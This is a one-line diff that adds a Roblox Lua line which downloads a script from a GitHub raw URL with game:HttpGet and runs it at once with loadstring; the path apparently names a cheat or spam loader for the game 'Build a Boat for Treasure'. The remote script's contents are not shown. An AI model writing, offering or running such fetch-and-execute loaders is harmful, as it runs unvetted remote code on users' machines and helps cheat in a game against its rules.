@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/build-a-boat-for-treasure-spam0-oos9n1wmo7oq3s.lua"))()
